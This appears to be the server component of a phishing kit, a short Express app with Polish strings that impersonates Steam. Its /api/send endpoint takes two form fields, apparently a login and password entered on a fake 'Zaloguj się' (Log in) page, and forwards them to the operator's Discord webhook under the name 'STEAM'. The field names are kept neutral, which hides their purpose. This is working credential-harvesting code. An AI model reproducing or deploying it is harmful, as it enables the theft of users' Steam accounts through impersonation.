const express = require("express");
const path = require("path");
require("dotenv").config();

const app = express();

const PORT = 3000;
const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

if (!WEBHOOK_URL) {
    console.error(
        "Brak jajec"
    );

    process.exit(1);
}

app.use(express.json());

app.use(express.static(path.join(__dirname)));

app.post("/api/send", async (req, res) => {

    try {
        const { pole1, pole2 } = req.body;

        if (
            typeof pole1 !== "string" ||
            typeof pole2 !== "string" ||
            !pole1.trim() ||
            !pole2.trim()
        ) {
            return res.status(400).json({
                error: "Uzupełnij oba pola."
            });
        }

        const discordResponse = await fetch(
            WEBHOOK_URL,
            {
                method: "POST",

                headers: {
                    "Content-Type": "application/json"
                },

                body: JSON.stringify({
                    username: "STEAM",

                    embeds: [
                        {
                            title: "Zaloguj się",

                            fields: [
                                {
                                    name: "Pole 1",
                                    value: pole1
                                        .trim()
                                        .substring(0, 1024),
                                    inline: false
                                },

                                {
                                    name: "Pole 2",
                                    value: pole2
                                        .trim()
                                        .substring(0, 1024),
                                    inline: false
                                }
                            ],

                            color: 6730740,

                            timestamp:
                                new Date().toISOString()
                        }
                    ]
                })
            }
        );

        if (!discordResponse.ok) {

            const errorText =
                await discordResponse.text();

            console.error(
                "Discord:",
                discordResponse.status,
                errorText
            );

            return res.status(502).json({
                error: "Błąd"
            });
        }

        res.json({
            success: true
        });

    } catch (error) {

        console.error(error);

        res.status(500).json({
            error: "Błąd serwera."
        });
    }
});


app.listen(PORT, () => {

    console.log(
        `STEAM działa na http://localhost:${PORT}`
    );

});
